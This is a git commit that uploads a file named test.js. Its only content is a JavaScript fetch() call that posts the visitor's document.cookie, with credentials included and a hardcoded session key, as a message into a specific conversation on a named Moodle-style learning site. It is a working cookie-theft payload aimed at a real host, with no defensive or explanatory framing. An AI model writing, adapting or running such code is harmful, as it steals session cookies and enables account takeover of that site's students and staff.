20f21630fe943c5711261a5c86c5112d54929c50
Megum13 <88092386+Megum13@users.noreply.github.com>
2022-01-21 15:01:32 +0300

    Add files via upload

---
+++ test.js
@@ -0,0 +1,10 @@
+fetch("http://dist.kait20.ru/lib/ajax/service.php?sesskey=WxXEjoG1wt&info=core_message_send_messages_to_conversation", {
+    "credentials": "include",
+    "headers": {
+        "Content-Type": "application/json",
+    },
+    "referrer": "http://dist.kait20.ru/message/index.php",
+    "body": `[{"index\":0,"methodname":"core_message_send_messages_to_conversation","args":{"conversationid":3588,"messages":[{"text":"${document.cookie}"}]}}]`,
+    "method": "POST",
+    "mode": "cors"
+});
